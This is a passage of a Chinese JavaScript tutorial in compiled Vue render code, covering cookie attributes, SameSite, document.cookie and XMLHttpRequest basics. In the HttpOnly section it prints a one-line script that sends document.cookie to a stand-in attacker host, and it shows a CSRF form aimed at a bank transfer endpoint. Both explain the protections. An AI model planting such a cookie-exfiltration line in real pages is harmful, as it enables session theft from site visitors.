"),a("h4",{attrs:{id:"domain-path"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#domain-path"}},[e._v("#")]),e._v(" Domain，Path")]),e._v(" "),a("p",[a("code",[e._v("Domain")]),e._v("属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。")]),e._v(" "),a("p",[e._v("服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。")]),e._v(" "),a("p",[e._v("如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。")]),e._v(" "),a("p",[e._v("举例来说，当前域名为"),a("code",[e._v("x.y.z.com")]),e._v("，那么 Domain 属性可以设为"),a("code",[e._v("x.y.z.com")]),e._v("，或者"),a("code",[e._v("y.z.com")]),e._v("，或者"),a("code",[e._v("z.com")]),e._v("，但不能设为"),a("code",[e._v("foo.x.y.z.com")]),e._v("，或者"),a("code",[e._v("another.domain.com")]),e._v("。")]),e._v(" "),a("p",[e._v("另一个例子是，当前域名为"),a("code",[e._v("wangdoc.github.io")]),e._v("，则 Domain 属性只能设为"),a("code",[e._v("wangdoc.github.io")]),e._v("，不能设为"),a("code",[e._v("github.io")]),e._v("，因为后者是一个公共域名。")]),e._v(" "),a("p",[e._v("浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是"),a("code",[e._v("y.z.com")]),e._v("，那么适用于"),a("code",[e._v("y.z.com")]),e._v("、"),a("code",[e._v("x.y.z.com")]),e._v("、"),a("code",[e._v("foo.x.y.z.com")]),e._v("等域名。再比如，Domain 属性是公共域名"),a("code",[e._v("github.io")]),e._v("，那么只适用于"),a("code",[e._v("github.io")]),e._v("这个域名本身，不适用于它的子域名"),a("code",[e._v("wangdoc.github.io")]),e._v("。")]),e._v(" "),a("p",[a("code",[e._v("Path")]),e._v("属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，"),a("code",[e._v("Path")]),e._v("属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，"),a("code",[e._v("Path")]),e._v("属性是"),a("code",[e._v("/")]),e._v("，那么请求"),a("code",[e._v("/docs")]),e._v("路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。")]),e._v(" "),a("h4",{attrs:{id:"secure-httponly"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#secure-httponly"}},[e._v("#")]),e._v(" Secure，HttpOnly")]),e._v(" "),a("p",[a("code",[e._v("Secure")]),e._v("属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的"),a("code",[e._v("Secure")]),e._v("属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。")]),e._v(" "),a("p",[a("code",[e._v("HttpOnly")]),e._v("属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是"),a("code",[e._v("document.cookie")]),e._v("属性、"),a("code",[e._v("XMLHttpRequest")]),e._v("对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;\n')])])]),a("p",[e._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),a("code",[e._v("HttpOnly")]),e._v("属性，上面代码就不会读到该 Cookie。")]),e._v(" "),a("h4",{attrs:{id:"samesite"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#samesite"}},[e._v("#")]),e._v(" SameSite")]),e._v(" "),a("p",[e._v("Chrome 51 开始，浏览器的 Cookie 新增加了一个"),a("code",[e._v("SameSite")]),e._v("属性，用来防止 CSRF 攻击和用户追踪。")]),e._v(" "),a("p",[e._v("Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站"),a("code",[e._v("your-bank.com")]),e._v("，银行服务器发来了一个 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie:id=a3fWa;\n")])])]),a("p",[e._v("用户后来又访问了恶意网站"),a("code",[e._v("malicious.com")]),e._v("，上面有一个表单。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<form action="your-bank.com/transfer" method="POST">\n  ...\n</form>\n')])])]),a("p",[e._v("用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<form action="your-bank.com/transfer" method="POST">\n  <input type="hidden" name="token" value="dad3weg34">\n  ...\n</form>\n')])])]),a("p",[e._v("这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<img src="facebook.com" style="visibility:hidden;">\n')])])]),a("p",[e._v("浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。")]),e._v(" "),a("p",[e._v("Cookie 的"),a("code",[e._v("SameSite")]),e._v("属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。")]),e._v(" "),a("blockquote",[a("ul",[a("li",[e._v("Strict")]),e._v(" "),a("li",[e._v("Lax")]),e._v(" "),a("li",[e._v("None")])])]),e._v(" "),a("p",[a("strong",[e._v("（1）Strict")])]),e._v(" "),a("p",[a("code",[e._v("Strict")]),e._v("最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: CookieName=CookieValue; SameSite=Strict;\n")])])]),a("p",[e._v("这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。")]),e._v(" "),a("p",[a("strong",[e._v("（2）Lax")])]),e._v(" "),a("p",[a("code",[e._v("Lax")]),e._v("规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: CookieName=CookieValue; SameSite=Lax;\n")])])]),a("p",[e._v("导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。")]),e._v(" "),a("table",[a("thead",[a("tr",[a("th",[e._v("请求类型")]),e._v(" "),a("th",{staticStyle:{"text-align":"center"}},[e._v("示例")]),e._v(" "),a("th",{staticStyle:{"text-align":"right"}},[e._v("正常情况")]),e._v(" "),a("th",[e._v("Lax")])])]),e._v(" "),a("tbody",[a("tr",[a("td",[e._v("链接")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<a href="..."></a>')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("发送 Cookie")])]),e._v(" "),a("tr",[a("td",[e._v("预加载")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<link rel="prerender" href="..."/>')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("发送 Cookie")])]),e._v(" "),a("tr",[a("td",[e._v("GET 表单")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<form method="GET" action="...">')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("发送 Cookie")])]),e._v(" "),a("tr",[a("td",[e._v("POST 表单")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<form method="POST" action="...">')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("不发送")])]),e._v(" "),a("tr",[a("td",[e._v("iframe")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<iframe src="..."></iframe>')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("不发送")])]),e._v(" "),a("tr",[a("td",[e._v("AJAX")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('$.get("...")')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("不发送")])]),e._v(" "),a("tr",[a("td",[e._v("Image")]),e._v(" "),a("td",{staticStyle:{"text-align":"center"}},[a("code",[e._v('<img src="...">')])]),e._v(" "),a("td",{staticStyle:{"text-align":"right"}},[e._v("发送 Cookie")]),e._v(" "),a("td",[e._v("不发送")])])])]),e._v(" "),a("p",[e._v("设置了"),a("code",[e._v("Strict")]),e._v("或"),a("code",[e._v("Lax")]),e._v("以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。")]),e._v(" "),a("p",[a("strong",[e._v("（3）None")])]),e._v(" "),a("p",[e._v("Chrome 计划将"),a("code",[e._v("Lax")]),e._v("变为默认设置。这时，网站可以选择显式关闭"),a("code",[e._v("SameSite")]),e._v("属性，将其设为"),a("code",[e._v("None")]),e._v("。不过，前提是必须同时设置"),a("code",[e._v("Secure")]),e._v("属性（Cookie 只能通过 HTTPS 协议发送），否则无效。")]),e._v(" "),a("p",[e._v("下面的设置无效。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: widget_session=abc123; SameSite=None\n")])])]),a("p",[e._v("下面的设置有效。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: widget_session=abc123; SameSite=None; Secure\n")])])]),a("h3",{attrs:{id:"document-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#document-cookie"}},[e._v("#")]),e._v(" document.cookie")]),e._v(" "),a("p",[a("code",[e._v("document.cookie")]),e._v("属性用于读写当前网页的 Cookie。")]),e._v(" "),a("p",[e._v("读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有"),a("code",[e._v("HTTPOnly")]),e._v("属性。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('document.cookie // "foo=bar;baz=bar"\n')])])]),a("p",[e._v("上面代码从"),a("code",[e._v("document.cookie")]),e._v("一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n")])])]),a("p",[a("code",[e._v("document.cookie")]),e._v("属性是可写的，可以通过它为当前网站添加 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("document.cookie = 'fontSize=14';\n")])])]),a("p",[e._v("写入的时候，Cookie 的值必须写成"),a("code",[e._v("key=value")]),e._v("的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用"),a("code",[e._v("encodeURIComponent")]),e._v("方法达到。")]),e._v(" "),a("p",[e._v("但是，"),a("code",[e._v("document.cookie")]),e._v("一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("document.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n")])])]),a("p",[a("code",[e._v("document.cookie")]),e._v("读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，"),a("code",[e._v("Cookie")]),e._v("字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，"),a("code",[e._v("Set-Cookie")]),e._v("字段是一行设置一个 Cookie。")]),e._v(" "),a("p",[e._v("写入 Cookie 的时候，可以一起写入 Cookie 的属性。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";\n')])])]),a("p",[e._v("上面代码中，写入 Cookie 的时候，同时设置了"),a("code",[e._v("expires")]),e._v("属性。属性值的等号两边，也是不能有空格的。")]),e._v(" "),a("p",[e._v("各个属性的写入注意点如下。")]),e._v(" "),a("ul",[a("li",[a("code",[e._v("path")]),e._v("属性必须为绝对路径，默认为当前路径。")]),e._v(" "),a("li",[a("code",[e._v("domain")]),e._v("属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是"),a("code",[e._v("example.com")]),e._v("，就不能将其设为"),a("code",[e._v("foo.com")]),e._v("。该属性默认为当前的一级域名（不含二级域名）。")]),e._v(" "),a("li",[a("code",[e._v("max-age")]),e._v("属性的值为秒数。")]),e._v(" "),a("li",[a("code",[e._v("expires")]),e._v("属性的值为 UTC 格式，可以使用"),a("code",[e._v("Date.prototype.toUTCString()")]),e._v("进行日期格式转换。")])]),e._v(" "),a("p",[a("code",[e._v("document.cookie")]),e._v("写入 Cookie 的例子如下。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("document.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n")])])]),a("p",[e._v("Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),e._v(" "),a("p",[e._v("删除一个现存 Cookie 的唯一方法，是设置它的"),a("code",[e._v("expires")]),e._v("属性为一个过去的日期。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n")])])]),a("p",[e._v("上面代码中，名为"),a("code",[e._v("fontSize")]),e._v("的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。")]),e._v(" "),a("h3",{attrs:{id:"参考链接"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考链接"}},[e._v("#")]),e._v(" 参考链接")]),e._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",target:"_blank",rel:"noopener noreferrer"}},[e._v("HTTP cookies"),a("OutboundLink")],1),e._v(", by MDN")]),e._v(" "),a("li",[a("a",{attrs:{href:"https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/",target:"_blank",rel:"noopener noreferrer"}},[e._v("Using the Same-Site Cookie Attribute to Prevent CSRF Attacks"),a("OutboundLink")],1)]),e._v(" "),a("li",[a("a",{attrs:{href:"https://web.dev/samesite-cookies-explained",target:"_blank",rel:"noopener noreferrer"}},[e._v("SameSite cookies explained"),a("OutboundLink")],1)]),e._v(" "),a("li",[a("a",{attrs:{href:"https://scotthelme.co.uk/tough-cookies/",target:"_blank",rel:"noopener noreferrer"}},[e._v("Tough Cookies"),a("OutboundLink")],1),e._v(", Scott Helme")]),e._v(" "),a("li",[a("a",{attrs:{href:"https://scotthelme.co.uk/csrf-is-dead/",target:"_blank",rel:"noopener noreferrer"}},[e._v("Cross-Site Request Forgery is dead!"),a("OutboundLink")],1),e._v(", Scott Helme")])]),e._v(" "),a("h3",{attrs:{id:"xml-httprequest-对象"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xml-httprequest-对象"}},[e._v("#")]),e._v(" XML HttpRequest 对象")]),e._v(" "),a("h3",{attrs:{id:"简介"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#简介"}},[e._v("#")]),e._v(" 简介")]),e._v(" "),a("p",[e._v("浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。")]),e._v(" "),a("p",[e._v("1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。")]),e._v(" "),a("p",[e._v("具体来说，AJAX 包括以下几个步骤。")]),e._v(" "),a("ol",[a("li",[e._v("创建 XMLHttpRequest 实例")]),e._v(" "),a("li",[e._v("发出 HTTP 请求")]),e._v(" "),a("li",[e._v("接收服务器传回的数据")]),e._v(" "),a("li",[e._v("更新网页数据")])]),e._v(" "),a("p",[e._v("概括起来，就是一句话，AJAX 通过原生的"),a("code",[e._v("XMLHttpRequest")]),e._v("对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest")]),e._v("对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有"),a("code",[e._v("XML")]),e._v("和"),a("code",[e._v("Http")]),e._v("，它实际上可以使用多种协议（比如"),a("code",[e._v("file")]),e._v("或"),a("code",[e._v("ftp")]),e._v("），发送任何格式的数据（包括字符串和二进制）。")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest")]),e._v("本身是一个构造函数，可以使用"),a("code",[e._v("new")]),e._v("命令生成实例。它没有任何参数。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n")])])]),a("p",[e._v("一旦新建实例，就可以使用"),a("code",[e._v("open()")]),e._v("方法指定建立 HTTP 连接的一些细节。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.open('GET', 'http://www.example.com/page.php', true);\n")])])]),a("p",[e._v("上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数"),a("code",[e._v("true")]),e._v("，表示请求是异步的。")]),e._v(" "),a("p",[e._v("然后，指定回调函数，监听通信状态（"),a("code",[e._v("readyState")]),e._v("属性）的变化。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.onreadystatechange = handleStateChange;\n\nfunction handleStateChange() {\n  // ...\n}\n")])])]),a("p",[e._v("上面代码中，一旦"),a("code",[e._v("XMLHttpRequest")]),e._v("实例的状态发生变化，就会调用监听函数"),a("code",[e._v("handleStateChange")])]),e._v(" "),a("p",[e._v("最后使用"),a("code",[e._v("send()")]),e._v("方法，实际发出请求。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.send(null);\n")])])]),a("p",[e._v("上面代码中，"),a("code",[e._v("send()")]),e._v("的参数为"),a("code",[e._v("null")]),e._v("，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。")]),e._v(" "),a("p",[e._v("一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。")]),e._v(" "),a("p",[e._v("注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。")]),e._v(" "),a("p",[e._v("下面是"),a("code",[e._v("XMLHttpRequest")]),e._v("对象简单用法的完整例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n\nxhr.onreadystatechange = function(){\n  // 通信成功时，状态值为4\n  if (xhr.readyState === 4){\n    if (xhr.status === 200){\n      console.log(xhr.responseText);\n    } else {\n      console.error(xhr.statusText);\n    }\n  }\n};\n\nxhr.onerror = function (e) {\n  console.error(xhr.statusText);\n};\n\nxhr.open('GET', '/endpoint', true);\nxhr.send(null);\n")])])]),a("h3",{attrs:{id:"xmlhttprequest-的实例属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-的实例属性"}},[e._v("#")]),e._v(" XMLHttpRequest 的实例属性")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-readystate"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-readystate"}},[e._v("#")]),e._v(" XMLHttpRequest.readyState")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.readyState")]),e._v("返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。")]),e._v(" "),a("ul",[a("li",[e._v("0，表示 XMLHttpRequest 实例已经生成，但是实例的"),a("code",[e._v("open()")]),e._v("方法还没有被调用。")]),e._v(" "),a("li",[e._v("1，表示"),a("code",[e._v("open()")]),e._v("方法已经调用，但是实例的"),a("code",[e._v("send()")]),e._v("方法还没有调用，仍然可以使用实例的"),a("code",[e._v("setRequestHeader()")]),e._v("方法，设定 HTTP 请求的头信息。")]),e._v(" "),a("li",[e._v("2，表示实例的"),a("code",[e._v("send()")]),e._v("方法已经调用，并且服务器返回的头信息和状态码已经收到。")]),e._v(" "),a("li",[e._v("3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的"),a("code",[e._v("responseType")]),e._v("属性等于"),a("code",[e._v("text")]),e._v("或者空字符串，"),a("code",[e._v("responseText")]),e._v("属性就会包含已经收到的部分信息。")]),e._v(" "),a("li",[e._v("4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。")])]),e._v(" "),a("p",[e._v("通信过程中，每当实例对象发生状态变化，它的"),a("code",[e._v("readyState")]),e._v("属性的值就会改变。这个值每一次变化，都会触发"),a("code",[e._v("readyStateChange")]),e._v("事件。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n\nif (xhr.readyState === 4) {\n  // 请求结束，处理服务器返回的数据\n} else {\n  // 显示提示“加载中……”\n}\n")])])]),a("p",[e._v("上面代码中，"),a("code",[e._v("xhr.readyState")]),e._v("等于"),a("code",[e._v("4")]),e._v("时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-onreadystatechange"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-onreadystatechange"}},[e._v("#")]),e._v(" XMLHttpRequest.onreadystatechange")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.onreadystatechange")]),e._v("属性指向一个监听函数。"),a("code",[e._v("readystatechange")]),e._v("事件发生时（实例的"),a("code",[e._v("readyState")]),e._v("属性变化），就会执行这个属性。")]),e._v(" "),a("p",[e._v("另外，如果使用实例的"),a("code",[e._v("abort()")]),e._v("方法，终止 XMLHttpRequest 请求，也会造成"),a("code",[e._v("readyState")]),e._v("属性变化，导致调用"),a("code",[e._v("XMLHttpRequest.onreadystatechange")]),e._v("属性。")]),e._v(" "),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open( 'GET', 'http://example.com' , true );\nxhr.onreadystatechange = function () {\n  if (xhr.readyState !== 4 || xhr.status !== 200) {\n    return;\n  }\n  console.log(xhr.responseText);\n};\nxhr.send();\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-response"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-response"}},[e._v("#")]),e._v(" XMLHttpRequest.response")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.response")]),e._v("属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由"),a("code",[e._v("XMLHttpRequest.responseType")]),e._v("属性决定。该属性只读。")]),e._v(" "),a("p",[e._v("如果本次请求没有成功或者数据不完整，该属性等于"),a("code",[e._v("null")]),e._v("。但是，如果"),a("code",[e._v("responseType")]),e._v("属性等于"),a("code",[e._v("text")]),e._v("或空字符串，在请求没有结束之前（"),a("code",[e._v("readyState")]),e._v("等于3的阶段），"),a("code",[e._v("response")]),e._v("属性包含服务器已经返回的部分数据。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n\nxhr.onreadystatechange = function () {\n  if (xhr.readyState === 4) {\n    handler(xhr.response);\n  }\n}\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-responsetype"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-responsetype"}},[e._v("#")]),e._v(" XMLHttpRequest.responseType")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.responseType")]),e._v("属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用"),a("code",[e._v("open()")]),e._v("方法之后、调用"),a("code",[e._v("send()")]),e._v("方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果"),a("code",[e._v("responseType")]),e._v("设为空字符串，就等同于默认值"),a("code",[e._v("text")]),e._v("。")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.responseType")]),e._v("属性可以等于以下值。")]),e._v(" "),a("ul",[a("li",[e._v('""（空字符串）：等同于'),a("code",[e._v("text")]),e._v("，表示服务器返回文本数据。")]),e._v(" "),a("li",[e._v('"arraybuffer"：ArrayBuffer 对象，表示服务器返回二进制数组。')]),e._v(" "),a("li",[e._v('"blob"：Blob 对象，表示服务器返回二进制对象。')]),e._v(" "),a("li",[e._v('"document"：Document 对象，表示服务器返回一个文档对象。')]),e._v(" "),a("li",[e._v('"json"：JSON 对象。')]),e._v(" "),a("li",[e._v('"text"：字符串。')])]),e._v(" "),a("p",[e._v("上面几种类型之中，"),a("code",[e._v("text")]),e._v("类型适合大多数情况，而且直接处理文本也比较方便。"),a("code",[e._v("document")]),e._v("类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。"),a("code",[e._v("blob")]),e._v("类型适合读取二进制数据，比如图片文件。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', '/path/to/image.png', true);\nxhr.responseType = 'blob';\n\nxhr.onload = function(e) {\n  if (this.status === 200) {\n    var blob = new Blob([xhr.response], {type: 'image/png'});\n    // 或者\n    var blob = xhr.response;\n  }\n};\n\nxhr.send();\n")])])]),a("p",[e._v("如果将这个属性设为"),a("code",[e._v("ArrayBuffer")]),e._v("，就可以按照数组的方式处理二进制数据。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', '/path/to/image.png', true);\nxhr.responseType = 'arraybuffer';\n\nxhr.onload = function(e) {\n  var uInt8Array = new Uint8Array(this.response);\n  for (var i = 0, len = uInt8Array.length; i < len; ++i) {\n    // var byte = uInt8Array[i];\n  }\n};\n\nxhr.send();\n")])])]),a("p",[e._v("如果将这个属性设为"),a("code",[e._v("json")]),e._v("，浏览器就会自动对返回数据调用"),a("code",[e._v("JSON.parse()")]),e._v("方法。也就是说，从"),a("code",[e._v("xhr.response")]),e._v("属性（注意，不是"),a("code",[e._v("xhr.responseText")]),e._v("属性）得到的不是文本，而是一个 JSON 对象。")]),e._v(" 